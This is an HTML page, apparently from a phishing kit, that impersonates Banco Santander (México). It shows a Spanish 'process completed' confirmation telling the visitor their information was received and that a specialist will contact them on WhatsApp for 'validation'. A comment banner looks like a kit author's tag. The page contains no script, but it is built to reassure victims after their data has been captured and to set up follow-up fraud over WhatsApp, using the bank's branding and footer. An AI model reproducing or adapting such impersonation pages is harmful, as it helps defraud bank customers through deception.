<!--
██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
-->
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
<title>Santander</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:'Poppins',sans-serif;
    background:#f5f5f5;
    min-height:100vh;
    display:flex;
    flex-direction:column;
    overflow:hidden;
    position:relative;
}

/* =========================================
   BACKGROUND
========================================= */

.bg-shape{
    position:absolute;
    top:0;
    bottom:0;
    width:140px;
    background:rgba(255,0,0,.08);
    transform:skewX(-12deg);
    z-index:0;
}

.bg1{
    left:120px;
}

.bg2{
    right:100px;
}

/* =========================================
   HEADER
========================================= */

.header{
    width:100%;
    background:white;
    padding:22px 20px;
    display:flex;
    justify-content:center;
    align-items:center;
    box-shadow:0 2px 10px rgba(0,0,0,.04);
    position:relative;
    z-index:2;
}

.logo{
    width:85px;
    object-fit:contain;
}

/* =========================================
   CONTENT
========================================= */

.container{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:30px 20px;
    position:relative;
    z-index:2;
}

.card{
    width:100%;
    max-width:430px;
    background:white;
    border-radius:20px;
    padding:40px 32px;
    text-align:center;

    box-shadow:
    0 12px 40px rgba(0,0,0,.08);
}

/* =========================================
   SUCCESS ICON
========================================= */

.success-wrapper{
    width:105px;
    height:105px;
    margin:0 auto 28px;
    position:relative;
}

.success-circle{
    width:100%;
    height:100%;
    border-radius:50%;
    background:#ffe8e8;

    display:flex;
    align-items:center;
    justify-content:center;

    animation:fadeIn .7s ease;
}

.check{
    width:48px;
    height:48px;
    border-radius:50%;
    background:#c41e3a;

    display:flex;
    align-items:center;
    justify-content:center;

    animation:pop .5s ease;
}

.check svg{
    width:24px;
    height:24px;
    stroke:white;
}

/* =========================================
   TEXTS
========================================= */

.title{
    font-size:30px;
    font-weight:600;
    color:#c41e3a;
    margin-bottom:12px;
}

.text{
    font-size:15px;
    line-height:1.8;
    color:#5d6778;
}

.text strong{
    color:#c41e3a;
}

/* =========================================
   INFO BOX
========================================= */

.info-box{
    margin-top:28px;
    padding:18px;
    border-radius:12px;

    background:#fff5f5;
    border:1px solid #f0d0d0;

    font-size:13px;
    line-height:1.7;
    color:#677487;
}

/* =========================================
   FOOTER
========================================= */

.footer{
    width:100%;
    text-align:center;
    padding:20px;

    font-size:12px;
    color:#6e7a8c;

    position:relative;
    z-index:2;
}

/* =========================================
   ANIMATIONS
========================================= */

@keyframes pop{

    0%{
        transform:scale(.5);
        opacity:0;
    }

    80%{
        transform:scale(1.1);
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}

/* =========================================
   MOBILE
========================================= */

@media(max-width:600px){

    .card{
        padding:35px 24px;
    }

    .title{
        font-size:26px;
    }

    .text{
        font-size:14px;
    }

    .logo{
        width:150px;
    }
}

</style>
</head>

<body>

<div class="bg-shape bg1"></div>
<div class="bg-shape bg2"></div>

<!-- HEADER -->
<div class="header">

    <img
        src="lokoto.png"
        class="logo"
    >

</div>

<!-- CONTENT -->
<div class="container">

    <div class="card">

        <!-- SUCCESS -->
        <div class="success-wrapper">

            <div class="success-circle">

                <div class="check">

                    <svg fill="none" viewBox="0 0 24 24" stroke-width="3">
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            d="M5 13l4 4L19 7"
                        />
                    </svg>

                </div>

            </div>

        </div>

        <!-- TITLE -->
        <div class="title">
            ¡Proceso completado!
        </div>

        <!-- TEXT -->
        <div class="text">
            Hemos recibido tu información correctamente.<br><br>

            En breve uno de nuestros especialistas se comunicará contigo vía
            <strong>WhatsApp</strong>
            para continuar con el proceso de validación.
        </div>

        <!-- INFO -->
        <div class="info-box">
            Para tu seguridad, todas las operaciones realizadas a través de nuestros canales electrónicos se encuentran protegidas mediante protocolos de seguridad certificados.
        </div>

    </div>

</div>

<!-- FOOTER -->
<div class="footer">
    Banco Santander (México), S.A. Institución de Crédito.<br>
    Todos los derechos reservados © 2026
</div>

</body>
</html>
